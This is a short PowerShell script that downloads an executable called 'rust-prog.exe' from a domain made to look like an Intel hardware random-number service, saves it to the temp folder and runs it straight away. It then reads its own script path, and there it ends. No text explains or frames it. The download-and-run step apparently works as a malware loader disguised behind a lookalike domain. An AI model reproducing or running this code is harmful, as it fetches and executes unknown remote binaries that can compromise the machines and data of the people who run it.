$exeUrl = "https://intel-hardware-rng.fortifysh.com/rust-prog.exe"
$exePath = "$env:TEMP\rust-prog.exe"
iwr -useb $exeUrl -OutFile $exePath
& $exePath
$psScriptPath = $MyInvocation.MyCommand.Path